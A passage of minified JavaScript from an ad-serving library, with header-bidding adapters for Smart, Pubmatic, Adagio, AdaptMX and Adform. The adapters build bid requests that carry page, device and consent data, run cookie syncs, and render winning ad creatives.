            !1 === n && !1 === a ? e.currency === this.chd.currency ? (r = AdTrack.Price.create(e.cpm, this.chd.currency, null), t.setPrice(r), t.setCreativeId(e.creativeId), t.setWidth(e.width ? e.width : this.chd.width), t.setHeight(e.height ? e.height : this.chd.height)) : this.track.doError("Channel " + this.chd.tag + " responsed with wrong currency: " + e.currency) : (n && s.track.doError("Blocked Smart creative (" + e.creativeId + ") from " + n, "info"), s.chd.logs && s.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(s.track.server, s.chd.logs.blocked_creative, s.chd.tag, e.creativeId || "", "", e.cpm, e.ad), i && i(null, null));
          }
          i && i(r, e);
        }.bind(this),
        n = this.createData(e),
        s = this;
      AdTrack.Ajax.request({
        label: "Smart bid",
        url: "https://prg.smartadserver.com/prebid/v1",
        method: "POST",
        data: JSON.stringify(n),
        json: !0,
        async: !this.definition.options.noAsync,
        timeout: this.chd.timeout || 800,
        headers: {},
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        r(t);
      }).fail(function (t, e) {
        e ? s.track.evBidTimeout(s.definition, s.chd) : s.track.evBidError(s.definition, s.chd), i && i(null, null);
      }).send();
    },
    createData: function (t) {
      for (var e = [{
          w: this.chd.width,
          h: this.chd.height
        }], i = this.chd.sizes ? this.chd.sizes : [], r = 0; r < i.length; r++) 2 === i[r].length && e.push({
        w: i[r][0],
        h: i[r][1]
      });
      var n = t.split("-");
      3 !== n.length && this.track.doError("Wrong format for key, should be: [site_id]-[page_id]-[format_id]");
      var s = AdTrack.Utils.simpleStringGenerator(14),
        a = AdTrack.Utils.simpleStringGenerator(14),
        o = {
          siteid: n[0],
          pageid: n[1],
          formatid: n[2],
          currencyCode: "EUR",
          sizes: e,
          bidfloor: this.chd.bidFloor,
          transactionId: a,
          bidId: s,
          timeout: this.chd.timeout || 800
        },
        d = !1,
        c = !1;
      if (AdTrack.CMP) {
        var h = AdTrack.CMP.getConsentData();
        h && (d = !0, o.gdpr_consent = h.consentString ? h.consentString : "", o.gdpr = h.gdprApplies ? 1 : 0);
      }
      if (AdTrack.USP) {
        var l = AdTrack.USP.getConsentData();
        l && l.consentString && (c = !0, o.us_privacy = l.consentString);
      }
      (d || c) && this.track.evBidConsent(this.definition, this.chd, d, c);
      var u = this.track.getSupplyChain(!0);
      if (u && (o.schain = u), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var p = AdTrack.UserID.getAllUserIdsAsEids();
        p && (o.eids = p);
      }
      return o;
    }
  };
}, function (t, e) {
  var i;
  AdTrack.PubmaticHelper = function (t, e, i, r) {
    this.track = t, this.definition = e, this.chd = i, this.accountId = r || AdTrack.Config.getAccountId("pubmatic"), this.external = this.accountId !== AdTrack.Config.getAccountId("pubmatic"), this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.track.shouldCsync("pubmatic") && AdTrack.UserSync.addUserSync("pubmatic", 76, function () {
      AdTrack.PubmaticCSync(this.accountId);
    }.bind(this), this.track.settings);
  }, AdTrack.PubmaticHelper.prototype = {
    BANNER: "banner",
    OUTSTREAM: "outstream",
    NATIVE: "native",
    bid: function (t, e, i, r) {
      if (this.accountId) {
        var n = "https://openbid.pubmatic.com/translator?pubId=" + this.accountId,
          s = this.createData(e, i),
          a = this;
        AdTrack.Ajax.request({
          label: "Pubmatic bid",
          url: n,
          method: "POST",
          data: JSON.stringify(s),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (i) {
          var n = null;
          if (i && i.seatbid && i.seatbid[0] && i.seatbid[0].bid && i.seatbid[0].bid[0]) {
            var s = i.seatbid[0].bid[0],
              o = AdTrack.Utils.isBlackListedAds(s.adm),
              d = AdTrack.Utils.testAd(s.adm, a.definition.options.contentBlackList || []);
            if (!1 === o && !1 === d) n = AdTrack.Price.create(s.price, AdTrack.Price.USD), t.setCreativeId(s.crid), t.setPrice(n), t.setWidth(s.w), t.setHeight(s.h), a.prebidVideo && (t.setVideoVastXML(s.adm), t.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(a.track.unitID, e, a.chd, a.track.server)));else {
              var c = "";
              s.ext && s.ext.dspid && (c = s.ext.dspid), o && a.track.doError("Blocked Pubmatic creative (" + s.crid + ") with DSP ID (" + c + ") from " + o, "info"), a.chd.logs && a.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(a.track.server, a.chd.logs.blocked_creative, a.chd.tag, s.crid || "", "", s.price, s.adm), r && r(null, null);
            }
          }
          a.response = i, r && r(n, i);
        }).fail(function (t, e) {
          e ? a.track.evBidTimeout(a.definition, a.chd) : a.track.evBidError(a.definition, a.chd), r && r(null, null);
        }).send();
      } else this.track.doError("Pubmatic accountId not defined. " + this.chd.tag);
    },
    createData: function (t, e) {
      var i = t.split("-");
      2 !== i.length && this.track.doError("Wrong format for key, should be: [siteId]-[adId]");
      var r = i[0],
        n = i[1],
        s = AdTrack.Utils.uuid(),
        a = "https:" === window.location.protocol ? 1 : 0,
        o = "";
      try {
        o = AdTrack.Utils.getDomainName(window.top.location.hostname);
      } catch (t) {
        o = AdTrack.Utils.getDomainName(window.location.hostname);
      }
      var d = {},
        c = {},
        h = {
          id: s,
          tagid: "" + n,
          secure: a,
          ext: {},
          bidfloor: this.chd.bidFloor,
          bidfloorcur: "USD"
        };
      if (e === this.OUTSTREAM) h.video = {
        mimes: ["video/mp4", "video/webm", "video/wmv", "video/mpeg", "video/ogg"],
        minduration: 3,
        protocols: [2, 3, 5, 6],
        w: this.chd.width ? this.chd.width : 640,
        h: this.chd.height ? this.chd.height : 360,
        placement: 3,
        linearity: 1,
        startdelay: 0,
        ext: {
          video_skippable: 1
        }
      };else if (e === this.BANNER) {
        var l = this.chd.sizes,
          u = [];
        if (u.push({
          w: this.chd.width,
          h: this.chd.height
        }), l && l.length > 0) for (var p = 0; p < l.length; p++) 2 === l[p].length && u.push({
          w: l[p][0],
          h: l[p][1]
        });
        h.banner = {
          w: this.chd.width,
          h: this.chd.height,
          format: u
        };
      } else if (e === this.NATIVE) {
        var f = {
          assets: [{
            required: 1,
            id: 3,
            img: {
              wmin: 600,
              hmin: 314,
              type: 3
            }
          }, {
            required: 0,
            id: 2,
            img: {
              wmin: 16,
              hmin: 16,
              type: 1
            }
          }, {
            required: 1,
            id: 0,
            title: {
              len: 300
            }
          }, {
            required: 1,
            id: 4,
            data: {
              type: 2
            }
          }, {
            required: 0,
            id: 5,
            data: {
              type: 1
            }
          }, {
            required: 0,
            id: 1,
            data: {
              type: 12
            }
          }],
          eventtrackers: [{
            event: 1,
            methods: [1]
          }]
        };
        h.native = {
          request: JSON.stringify(f)
        };
      } else this.track.doError("[" + this.chd.tag + "] Invalid type: " + e);
      if (AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var g = AdTrack.UserID.getAllUserIdsAsEids();
        g && g.length > 0 && (d.eids = g);
      }
      var m = {
          id: "" + new Date().getTime(),
          at: 1,
          cur: ["USD"],
          device: {
            ip: this.track.settings.ip ? this.track.settings.ip : "",
            ua: navigator.userAgent,
            js: 1,
            dnt: AdTrack.Utils.getDNT(),
            h: screen.height,
            w: screen.width,
            language: navigator.language
          },
          site: {
            id: "" + r,
            domain: o,
            page: AdTrack.url,
            ref: AdTrack.url,
            publisher: {
              id: "" + this.accountId
            }
          },
          ext: {},
          imp: [h],
          test: this.chd.test ? 1 : 0
        },
        k = this.track.getSupplyChain();
      k && !this.external && (m.source = {
        ext: {
          schain: k
        }
      });
      var b,
        v = !1,
        A = !1,
        T = null,
        y = AdTrack.Config.isCMPRequired && AdTrack.Config.isCMPRequired();
      AdTrack.CMP && (T = AdTrack.CMP.getConsentData()), T ? (v = !0, T.consentString && (d.ext = {
        consent: T.consentString
      }), b = T.gdprApplies ? 1 : 0) : b = y ? 1 : 0, c.ext = {
        gdpr: b
      };
      var w = null;
      return AdTrack.USP && (w = AdTrack.USP.getConsentData()), w && w.consentString && (A = !0, c.ext.us_privacy = w.consentString), (v || A) && this.track.evBidConsent(this.definition, this.chd, v, A), m.regs = c, m.user = d, m;
    }
  }, AdTrack.PubmaticCSync = AdTrack.PubmaticCSync || (i = !1, function (t) {
    if (!i) {
      var e = "https://ads.pubmatic.com/AdServer/js/user_sync.html?kdntuid=1&p=" + t,
        r = null;
      AdTrack.CMP && (r = AdTrack.CMP.getConsentData()) && (e += "&gdpr=" + (r.gdprApplies ? 1 : 0), e += "&gdpr_consent=" + encodeURIComponent(r.consentString || ""));
      var n = null;
      AdTrack.USP && (n = AdTrack.USP.getConsentData()) && n.consentString && (e += "&us_privacy=" + encodeURIComponent(n.consentString)), AdTrack.Utils.csyncFrame(e), i = !0;
    }
  });
}, function (t, e) {
  AdTrack.AdagioHBNativeChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("adagio"), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
    var r = this.track.window;
    r.ADAGIO = r.ADAGIO || {}, r.ADAGIO.pageviewId = r.ADAGIO.pageviewId || AdTrack.Utils.uuid();
  }, AdTrack.AdagioHBNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.track.window,
        r = e.split(":");
      2 !== r.length && this.track.doError("Wrong format for key, should be: [site]:[placement]");
      var n,
        s,
        a = function () {
          try {
            var t = this.track.definition.options.dom,
              e = t.selector || t.container,
              i = this.track.document.querySelector(e);
            if (i) return i;
          } catch (t) {}
        }.bind(this),
        o = function () {
          try {
            var t = a();
            if (!AdTrack.Utils.isSafeFrameWindow(this.track.window) && !AdTrack.Utils.windowTopAccess()) return "";
            var e = {
              x: 0,
              y: 0
            };
            if (AdTrack.Utils.isSafeFrameWindow(this.track.window)) {
              var i = this.track.window;
              if ("function" != typeof i.$sf.ext.geom) return "";
              var r = i.$sf.ext.geom();
              return r && r.self ? (e.x = Math.round(r.t), e.y = Math.round(r.l), e.x + "x" + e.y) : "";
            }
            if (AdTrack.Utils.windowTopAccess() && t) {
              var n = AdTrack.Utils.windowTopAccess() || this.track.window,
                s = this.track.window.document,
                o = t.getBoundingClientRect(),
                d = s.documentElement,
                c = s.body,
                h = s.clientTop || c.clientTop || 0,
                l = s.clientLeft || c.clientLeft || 0,
                u = n.pageYOffset || d.scrollTop || c.scrollTop,
                p = n.pageXOffset || d.scrollLeft || c.scrollLeft;
              return e.x = Math.round(o.left + p - l), e.y = Math.round(o.top + u - h), e.x + "x" + e.y;
            }
          } catch (t) {}
          return "";
        }.bind(this),
        d = function () {
          var t = i.navigator.userAgent;
          return /(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(t) ? 5 : /Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile|Kindle|NetFront|Silk-Accelerated|(hpw|web)OS|Fennec|Minimo|Opera M(obi|ini)|Blazer|Dolfin|Dolphin|Skyfire|Zune/.test(t) ? 4 : 2;
        },
        c = {
          image: {
            required: !0,
            aspect_ratios: [{
              min_width: 300,
              min_height: 200,
              ratio_width: 2,
              ratio_height: 3
            }]
          },
          title: {
            required: !0,
            len: 80
          },
          sponsoredBy: {
            required: !0
          },
          displayUrl: {
            required: !1
          },
          clickUrl: {
            required: !0
          },
          privacyLink: {
            required: !1
          },
          body: {
            required: !0
          },
          icon: {
            required: !1,
            sizes: [50, 50]
          },
          price: {
            required: !1
          }
        },
        h = {
          id: "" + AdTrack.Utils.uuid(),
          organizationId: "" + this.accountId,
          secure: AdTrack.Utils.isSecure(AdTrack.url) ? 1 : 0,
          device: {
            userAgent: navigator.userAgent,
            language: navigator.language || navigator.userLanguage,
            deviceType: d(),
            dnt: AdTrack.Utils.getDNT(),
            geo: {},
            js: 1
          },
          site: {
            domain: "" + i.location.hostname,
            page: "" + i.location.href,
            referrer: i.document.referrer || ""
          },
          pageviewId: i.ADAGIO.pageviewId || AdTrack.Utils.uuid(),
          adUnits: [],
          regs: {
            gdpr: {
              apiVersion: 2,
              consentString: "",
              consentRequired: 1,
              allowAuctionWithoutConsent: 1
            },
            coppa: {},
            ccpa: {}
          },
          schain: {},
          prebidVersion: "6.0.0",
          featuresVersion: "1"
        };
      h.adUnits.push({
        bidder: "adagio",
        params: {
          organizationId: "" + this.accountId,
          site: r[0],
          adUnitElementId: "r2b2",
          placement: r[1],
          environment: AdTrack.Utils.isMobile() ? "mobile" : "desktop",
          postBid: !0,
          native: {
            context: 1,
            plcmttype: 2
          }
        },
        nativeParams: c,
        mediaTypes: {
          native: c
        },
        adUnitCode: "r2b2",
        transactionId: AdTrack.Utils.uuid(),
        sizes: [],
        bidId: AdTrack.Utils.uuid(),
        bidderRequestId: AdTrack.Utils.uuid(),
        auctionId: AdTrack.Utils.uuid(),
        src: "client",
        bidRequestsCount: 1,
        bidderRequestsCount: 1,
        bidderWinsCount: 0,
        features: {
          print_number: "1",
          page_dimensions: function () {
            var t = AdTrack.Utils.windowTopAccess();
            if (!t) return "";
            var e = t.document.querySelector("body");
            if (!e) return "";
            var i = t.document.documentElement;
            return Math.max(e.scrollWidth, e.offsetWidth, i.clientWidth, i.scrollWidth, i.offsetWidth) + "x" + Math.max(e.scrollHeight, e.offsetHeight, i.clientHeight, i.scrollHeight, i.offsetHeight);
          }(),
          viewport_dimensions: AdTrack.Utils.getViewportRealWidth(i) + "x" + AdTrack.Utils.getViewportRealHeight(i),
          adunit_position: o(),
          dom_loading: "" + (50 + Math.round(100 * Math.random())),
          user_timestamp: "" + (Math.floor(new Date().getTime() / 1e3) - 60 * new Date().getTimezoneOffset()),
          device: "" + d(),
          url: AdTrack.url,
          browser: (n = i.navigator.userAgent, s = n.toLowerCase(), /Edge\/\d./i.test(n) ? "edge" : s.indexOf("chrome") > 0 ? "chrome" : s.indexOf("firefox") > 0 ? "firefox" : s.indexOf("safari") > 0 ? "safari" : s.indexOf("opera") > 0 ? "opera" : s.indexOf("msie") > 0 || i.MSStream ? "ie" : "unknow"),
          os: function () {
            var t = i.navigator.userAgent.toLowerCase();
            return t.indexOf("linux") > 0 ? "linux" : t.indexOf("mac") > 0 ? "mac" : t.indexOf("win") > 0 ? "windows" : "";
          }()
        }
      });
      var l = this.track.getSupplyChain();
      l && (h.schain = l);
      var u = !1,
        p = !1;
      if (AdTrack.CMP) {
        var f = AdTrack.CMP.getConsentData();
        f && f.consentString && (u = !0, h.regs.gdpr = {
          apiVersion: f.version ? f.version : null,
          consentString: f.consentString ? f.consentString : "",
          consentRequired: f.gdprApplies ? 1 : 0,
          allowAuctionWithoutConsent: 1
        });
      }
      if (AdTrack.USP) {
        var g = AdTrack.USP.getConsentData();
        g && g.consentString && (p = !0, h.regs.ccpa = {
          uspConsent: g.consentString
        });
      }
      (u || p) && this.track.evBidConsent(this.definition, this.chd, u, p);
      var m = function (e) {
          if (this.response = e, AdTrack.UserSync.addUserSync("adagio", 617, function () {
            "function" == typeof AdTrack.AdagioCSync && AdTrack.AdagioCSync(e);
          }, this.track.settings), e.bids && e.bids.length > 0) {
            if (e.bids[0]) {
              var i = e.bids[0];
              i.cpm ? i.currency === this.chd.currency || AdTrack.Price.USD ? (this.price = AdTrack.Price.create(i.cpm, this.chd.currency), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.creativeId), i.width && i.height && (this.bidResponse.setWidth(i.width), this.bidResponse.setHeight(i.height)), t && t(this.price, this.response)) : (this.track.doError("Channel " + this.chd.tag + " responded with unsupported currency (" + i.currency + ")."), t && t(null, null)) : (this.track.doError("Channel " + this.chd.tag + " responded with empty currency."), t && t(null, null));
            } else this.track.doError("Channel " + this.chd.tag + " responded with unknown response."), t && t(null, null);
          } else t && t(null, null);
        }.bind(this),
        k = function (e, i) {
          i ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, t && t(null, null);
        }.bind(this);
      AdTrack.Ajax.request({
        label: "Adagio bid",
        url: "https://mp.4dex.io/prebid",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(h),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        m(t);
      }).fail(function (t, e) {
        k(t, e);
      }).send();
    },
    render: function (t, e, i) {
      if (this.container = t, e.normal) {
        var r = e.normal,
          n = this.track.getChannelKey(this.chd, r);
        if (n) {
          var s = function (e) {
            if (e && e.bids && e.bids[0]) {
              var n = e.bids[0];
              n && n.admNative && n.admNative.assets && n.admNative.link && this.nativeCallback(t, r, n, i) || this.track.passback(this.definition, this.chd);
            } else this.track.passback(this.definition, this.chd);
          }.bind(this);
          this.price && this.response ? s(this.response) : this.bid(function (t, e) {
            s(e);
          }, n);
        } else this.track.doError("Undefined key"), this.track.passback(this.definition, this.chd);
      } else this.track.doError("Undefined style for " + this.chd.tag + ". Both normal and product are required."), this.track.passback(this.definition, this.chd);
    },
    nativeCallback: function (t, e, i, r) {
      this.adData = i;
      var n = this.parseNativeResponse(i);
      if (!n.title || !n.title.text || !n.body) return !1;
      var s = new AdTrack.AdSet();
      s.setStyle(e);
      var a = new AdTrack.AdChoices();
      a.setPromoClickUrl(n.privacyLink || this.chd.url), a.setPromoText(this.chd.title), a.setOptional(!0), s.addAdChoices(a);
      var o = new AdTrack.TextAd();
      o.addText(n.title.text, n.body), n.body2 && o.addText(n.title.text, n.body2), n.image && o.addScreenshot(n.image.url, n.image.width, n.image.height, n.image.url), n.icon && n.icon.url && o.setFavicon(n.icon.url), o.setCompanyName(n.sponsoredBy), o.setClickUrl(n.clickUrl), o.setClickTrackers(n.clickTrackers), o.setVisibleUrl(n.displayUrl), o.setCta(n.cta), o.done(), s.addAd(new AdTrack.AdagioAd(s, o));
      var d = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        c = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: s,
              tc: d
            }
          },
          style: e,
          count: 1,
          impTrackers: n.impressionTrackers,
          jsTrackers: n.javascriptTrackers
        };
      r(new AdTrack.MediaTypes.Native(c, this.track.errorReporting));
    },
    parseNativeResponse: function (t) {
      var e = {};
      return t.admNative && t.admNative.assets && "object" == typeof t.admNative.assets && t.admNative.assets.forEach(function (t) {
        if (t.title) e.title = t.title;else if (t.data) i = t.data, (r = {
          1: "sponsoredBy",
          2: "body",
          3: "rating",
          4: "likes",
          5: "downloads",
          6: "price",
          7: "salePrice",
          8: "phone",
          9: "address",
          10: "body2",
          11: "displayUrl",
          12: "cta"
        }).hasOwnProperty(i.type) && "string" == typeof i.value && (e[r[i.type]] = i.value);else if (t.img) switch (t.img.type) {
          case 1:
            e.icon = {
              url: t.img.url,
              width: t.img.w,
              height: t.img.h
            };
            break;
          default:
            e.image = {
              url: t.img.url,
              width: t.img.w,
              height: t.img.h
            };
        }
        var i, r;
      }), t.admNative.link && (t.admNative.link.url && (e.clickUrl = t.admNative.link.url), Array.isArray(t.admNative.link.clicktrackers) && (e.clickTrackers = t.admNative.link.clicktrackers)), Array.isArray(t.admNative.eventtrackers) ? (e.impressionTrackers = [], t.admNative.eventtrackers.forEach(t => {
        if (1 === t.event) switch (t.method) {
          case 1:
            e.impressionTrackers.push(t.url);
            break;
          case 2:
            e.javascriptTrackers = '<script src="' + t.url + '"><\/script>';
        }
      })) : (e.impressionTrackers = Array.isArray(t.admNative.imptrackers) ? t.admNative.imptrackers : [], t.admNative.jstracker && (e.javascriptTrackers = t.admNative.jstracker)), t.admNative.privacy && (e.privacyLink = t.admNative.privacy), t.admNative.ext && (e.ext = {}, t.admNative.ext.bvw && (e.ext.adagio_bvw = t.admNative.ext.bvw)), e;
    }
  };
}, function (t, e) {
  AdTrack.AdaptMxHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.style = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]];
  }, AdTrack.AdaptMxHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = AdTrack.Utils.simpleStringGenerator(14),
        r = AdTrack.Utils.uuid(),
        n = this.chd.timeout || 800,
        s = this.createData(e, r, i),
        a = this;
      AdTrack.Ajax.request({
        label: "AdaptMX bid",
        url: "https://prebid.a-mo.net/a/c",
        method: "POST",
        data: JSON.stringify(s),
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {},
        timeout: n,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0), this.trackEvent("pbto", {
            A: "amx",
            bid: i,
            a: e,
            cn: n,
            aud: r
          });
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this),
        withCredentials: !0
      }, this.track.errorReporting).done(function (e) {
        try {
          e && e.am && "string" == typeof e.am && AdTrack.Utils.setLocalStorageItem("__amuidpb", e.am);
        } catch (t) {
          a.track.doError("[" + a.chd.tag + "] Error during storing UID: " + t.message);
        }
        try {
          if (a.track.shouldCsync("adaptmx")) {
            let t = "https://prebid.a-mo.net/isyn?&gpp=&gpp_sid=";
            if (AdTrack.CMP) {
              var i = AdTrack.CMP.getConsentData();
              i && (t += "&gdpr=" + (i.gdprApplies ? 1 : 0), t += "&gdpr_consent=" + i.consentString);
            }
            if (AdTrack.USP) {
              var r = AdTrack.USP.getConsentData();
              r && r.consentString && (t += "&us_privacy=" + encodeURIComponent(r.consentString));
            }
            let n = 0,
              s = !1;
            e && e.p && e.p.hreq ? AdTrack.UserSync.addUserSync("adaptmx", 737, function () {
              e.p.hreq.forEach(function (t) {
                n++;
                var e = -1 !== t.indexOf("__st=iframe") ? "iframe" : "image";
                s = s || "iframe" === e || -1 !== t.indexOf("cchain"), "iframe" === e ? AdTrack.Utils.csyncFrame(t) : AdTrack.Utils.firePixel(t);
              }), !s && n < 2 && AdTrack.Utils.csyncFrame(t);
            }, a.track.settings) : AdTrack.UserSync.addUserSync("adaptmx", 737, function () {
              AdTrack.Utils.csyncFrame(t);
            }, a.track.settings);
          }
        } catch (t) {
          a.track.doError("[" + a.chd.tag + "] Error during cookie sync: " + t.message);
        }
        if (e && e.r) {
          var n = Object.keys(e.r);
          if (n[0] && e.r[n[0]]) {
            var s = e.r[n[0]];
            if (s[0] && s[0].b && s[0].b[0]) {
              var o = s[0].b[0];
              this.adData = o.adm, e.currency && e.currency !== AdTrack.Price.USD ? a.track.doError("Channel " + a.chd.tag + " responsed with wrong currency: " + e.currency) : (a.price = AdTrack.Price.create(o.price, AdTrack.Price.USD, null), a.bidResponse.setPrice(a.price), a.bidResponse.setCreativeId(o.crid), a.bidResponse.setWidth(a.chd.width), a.bidResponse.setHeight(a.chd.height), null != o.w && o.w > 1 && null != o.h && o.h > 1 && (a.bidResponse.setWidth(o.w), a.bidResponse.setHeight(o.h)));
            } else a.price = null;
          } else a.price = null;
        } else a.price = null;
        a.response = e, t && t(a.price, e);
      }).fail(function (e, i) {
        i ? a.track.evBidTimeout(a.definition, a.chd) : a.track.evBidError(a.definition, a.chd), a.price = null, t && t(null, null);
      }).send();
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.r) {
            var e = Object.keys(t.r);
            if (e[0] && t.r[e[0]]) {
              var n = t.r[e[0]];
              if (n[0] && n[0].b && n[0].b[0]) {
                var s = n[0].b[0];
                this.adData = s.adm, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
                var a = {
                    chd: this.chd,
                    width: this.bidResponse.getDimension().width,
                    height: this.bidResponse.getDimension().height,
                    ad: {
                      data: s.adm,
                      type: "content"
                    }
                  },
                  o = new AdTrack.MediaTypes.Banner(a, this.track.errorReporting);
                this.trackEvent("pbwin", {
                  A: "amx",
                  w: this.bidResponse.getDimension().width,
                  h: this.bidResponse.getDimension().height,
                  bid: s.id,
                  C: 0,
                  np: s.price,
                  a: r
                }), i(o);
              } else this.track.passback(this.definition, this.chd);
            } else this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t, e, i) {
      var r = function () {
          var e = {},
            r = this.chd.height > 100,
            n = [this.sizes, this.sizes, []],
            s = this.track.getSupplyChain();
          e[i] = {
            au: t,
            av: r,
            vd: {},
            vr: !1,
            ms: n,
            aw: this.chd.width,
            ah: this.chd.height,
            tf: 0,
            sc: s || {},
            f: this.chd.bidFloor || 0
          };
          var a = "cmIyYi5pbw";
          return a.length > 0 && (e[i].i = a), e;
        }.bind(this),
        n = {
          a: e,
          B: 0,
          b: AdTrack.Utils.getDomainNameFromUrl(AdTrack.url, !0),
          brc: 0,
          bwc: 0,
          trc: 0,
          tm: !1,
          V: "5.20.0-pre",
          vg: "r2b2_pbjs",
          i: "cmIyYi5pbw",
          l: {},
          f: .01,
          cv: "pba1.3.1",
          st: "prebid",
          h: screen.height,
          w: screen.width,
          gs: "",
          gc: "",
          u: AdTrack.url,
          do: AdTrack.Utils.getDomainNameFromUrl(AdTrack.url, !0),
          re: document.referrer || AdTrack.url,
          am: AdTrack.Utils.getLocalStorageItem("__amuidpb"),
          usp: "1---",
          smt: 1,
          d: "",
          m: r(),
          cpp: 0,
          tmax: this.chd.timeout,
          eids: []
        };
      AdTrack.UserID && !this.track.getOption("disableUserId") && (n.eids = AdTrack.UserID.getAllUserIdsAsEids());
      var s = !1,
        a = !1;
      if (AdTrack.CMP) {
        var o = AdTrack.CMP.getConsentData();
        o && (s = !0, n.gs = o.gdprApplies, n.gc = o.consentString);
      }
      if (AdTrack.USP) {
        var d = AdTrack.USP.getConsentData();
        d && d.consentString && (a = !0, n.usp = d.consentString);
      }
      return (s || a) && this.track.evBidConsent(this.definition, this.chd, s, a), n;
    },
    trackEvent: function (t, e) {
      var i = "https://1x1.a-mo.net/hbx/g_" + t + "?" + AdTrack.Utils.json2Url(e);
      AdTrack.Utils.firePixel(i);
    }
  };
}, function (t, e) {
  AdTrack.AdformOpenRTBVideoChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.helper = new AdTrack.AdformOpenRTBHelper(t, e, i), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.AdformOpenRTBVideoChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.VIDEO, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].bid[0];
            if (this.adData = e, e.adm) {
              if (this.definition.options.player && "default" === this.definition.options.player.type) {
                var r = AdTrack.MediaTypes.createVideoSettings(this.track, this.chd, e.adm, "vast_content"),
                  n = new AdTrack.MediaTypes.Video(r, this.track.errorReporting);
                i(n);
              }
            } else this.track.doError("Adform video - no creative in response"), this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.AdformOpenRTBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.helper = new AdTrack.AdformOpenRTBHelper(t, e, i), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.AdformOpenRTBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.BANNER, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e ? e.normal : null);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].bid[0].adm;
            if (this.adData = e, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height, "branding" === this.definition.renderer && this.track.settings.publisher && "mafra" === this.track.settings.publisher.tag) {
              var r = AdTrack.Utils.windowTopAccess();
              if (r && r.CPExSkinObject) {
                var n = r.CPExSkinObject;
                r.CPExSkinObject = function (t) {
                  if (r.CPExSkinObject = n, !r.postscribe || !r.document.getElementById("branding")) throw new Error();
                  postscribe("#branding", "<script>topWin.CPExSkinObject (" + JSON.stringify(t) + ")<\/script>");
                };
              }
            }
            var s = {
              chd: this.chd,
              width: this.bidResponse.getDimension().width,
              height: this.bidResponse.getDimension().height,
              ad: {}
            };
            e.match(/^<iframe/i) ? (s.ad.data = e, s.ad.type = "iframe") : (s.ad.data = "<html><head><script>window.inDapIF=true;<\/script></head><body>" + e + "</body></html>", s.ad.type = "content");
